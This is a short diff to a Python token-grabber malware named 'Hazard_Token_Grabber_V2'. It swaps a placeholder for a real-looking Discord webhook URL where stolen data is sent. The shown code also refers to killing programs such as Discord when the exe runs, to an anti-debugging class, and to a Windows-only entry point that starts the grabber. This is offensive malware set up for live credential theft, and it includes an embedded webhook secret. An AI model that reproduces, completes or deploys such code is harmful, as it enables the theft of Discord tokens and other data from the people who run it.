@@ -39,7 +39,7 @@ except:
 
 config = {
     # Replace WEBHOOK_URL with your own webhook. The collected data will be sent to this webhook. 
-    'webhook': "WEBHOOK_URL",
+    'webhook': "https://discord.com/api/webhooks/1349223901879730227/NWSNx6kF1xv0G1wPgwTrdPh_5JwdFWpHXxAOaW3VPFkfCBOg4WtlG65s7g3EshyA1ydK",
     
     # Set to False if you don't want it to kill programs such as discord upon running the exe.
     'kill_processes': True,
@@ -725,3 +725,4 @@ class AntiDebug(functions):
 
 if __name__ == "__main__" and os.name == "nt":
     asyncio.run(Hazard_Token_Grabber_V2().init())
+
